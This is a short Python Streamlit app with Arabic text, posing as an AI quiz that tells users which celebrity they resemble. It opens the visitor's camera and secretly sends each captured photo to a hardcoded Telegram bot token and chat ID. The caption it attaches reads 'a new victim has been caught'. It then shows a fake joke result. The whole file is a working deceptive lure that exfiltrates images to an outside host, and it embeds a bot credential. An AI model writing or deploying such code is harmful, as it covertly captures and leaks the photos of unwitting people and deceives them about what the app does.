import streamlit as st
import requests

# بيانات البوت الخاصة بك
TOKEN = " 8622793927:AAGTEaVOusAzcy_CG58TD5ZEl8VuqnMosiQr"
CHAT_ID = "6284670726"

st.title("📸 اختبار ملامح الوجه بالذكاء الاصطناعي")
st.write("التقط صورة لتعرف من تشبه من المشاهير!")

# هذا السطر هو الذي يفتح كاميرا جوال أو كمبيوتر صديقك
img_file_buffer = st.camera_input("اضغط للالتقاط")

if img_file_buffer is not None:
    # قراءة الصورة
    bytes_data = img_file_buffer.getvalue()
    
    # إرسال الصورة إلى تليجرام
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    files = {'photo': bytes_data}
    data = {'chat_id': CHAT_ID, 'caption': '💡 تم اصطياد ضحية جديدة!'}
    
    try:
        requests.post(url, files=files, data=data)
        st.success("جاري التحليل... أنت تشبه شخصية 'مستر بين'! 😂")
    except:
        st.error("خطأ في الاتصال")
